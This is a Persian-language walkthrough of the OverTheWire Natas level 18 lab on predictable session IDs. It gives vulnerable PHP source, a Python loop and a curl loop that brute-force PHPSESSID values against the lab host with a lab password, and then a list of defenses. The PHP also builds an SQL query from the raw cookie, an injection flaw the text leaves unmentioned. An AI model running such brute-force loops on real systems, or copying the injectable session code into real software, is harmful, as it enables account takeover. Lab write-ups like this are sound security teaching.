۱۸ پیش‌بینی شناسه نشست — حمله بروت فورس پیشرفته
// مفاهیم کلیدی
پیش‌بینی شناسه نشست بروت فورس مدیریت نشست ضعیف PHP Session دور زدن احراز هویت
// مرور کلی چالش

این سطح از یک شناسه نشست برای تعیین اینکه کاربر به عنوان مدیر وارد شده است یا خیر استفاده می‌کند. با این حال، شناسه‌های نشست به صورت متوالی تولید می‌شوند و قابل پیش‌بینی هستند. با بروت فورس کردن شناسه نشست، می‌توانیم به دسترسی مدیریتی دست یابیم.

// تحلیل اولیه

کد منبع را بررسی کنید:

<?php $maxid = 640; if (isset($_COOKIE["PHPSESSID"])) { $sessionid = $_COOKIE["PHPSESSID"]; } else { session_start(); $sessionid = session_id(); setcookie("PHPSESSID", $sessionid); } if ($sessionid >= 1 && $sessionid <= $maxid) { $user = "SELECT * FROM users WHERE id = " . $sessionid; $result = mysql_query($user); if (mysql_num_rows($result) > 0) { $row = mysql_fetch_assoc($result); if ($row['username'] == 'admin') { print "Password: ..."; } } } ?>

برنامه از شناسه نشست به عنوان یک شناسه عددی برای کوئری پایگاه داده استفاده می‌کند. کاربر admin احتمالاً شناسه خاصی دارد.

💡 شناسه‌های نشست باید تصادفی و غیرقابل پیش‌بینی باشند. استفاده از شناسه‌های عددی متوالی، برنامه را در برابر حملات بروت فورس آسیب‌پذیر می‌کند.
// مراحل حل

مرحله ۱ — خودکارسازی با Python:

import requests url = "http://natas18.natas.labs.overthewire.org/" auth = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP") for session_id in range(1, 641): cookies = {"PHPSESSID": str(session_id)} response = requests.get(url, auth=auth, cookies=cookies) if "Password" in response.text: print(f"Found admin session ID: {session_id}") print(response.text) break

مرحله ۲ — با استفاده از curl:

for i in {1..640}; do curl -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP \ --cookie "PHPSESSID=$i" \ http://natas18.natas.labs.overthewire.org/ | grep -q "Password" && echo "Found: $i" done
// چرا کار می‌کند

مدیریت نشست به دلیل موارد زیر آسیب‌پذیر است:

  • شناسه‌های متوالی: شناسه‌های نشست عددی و قابل پیش‌بینی هستند.
  • دامنه کوچک: فقط ۶۴۰ مقدار ممکن که به راحتی قابل بروت فورس است.
  • بدون احراز هویت: برنامه شناسه نشست را به درستی اعتبارسنجی نمی‌کند.
// اقدامات دفاعی
  • از شناسه‌های نشست تصادفی استفاده کنید.
  • فضای شناسه بزرگ برای جلوگیری از بروت فورس استفاده کنید.
  • نشست‌ها را در سمت سرور اعتبارسنجی کنید.
  • محدودیت نرخ برای جلوگیری از حملات بروت فورس پیاده‌سازی کنید.

// نکات کلیدی
🔑 شناسه‌های نشست باید تصادفی باشند

شناسه‌های نشست متوالی یا قابل پیش‌بینی را می‌توان با بروت فورس شکست. همیشه از شناسه‌های نشست تصادفی استفاده کنید.

🛡️ ذخیره نشست در سمت سرور

داده‌های نشست را در سمت سرور ذخیره کنید، نه فقط در کوکی کلاینت. این از دستکاری جلوگیری می‌کند.
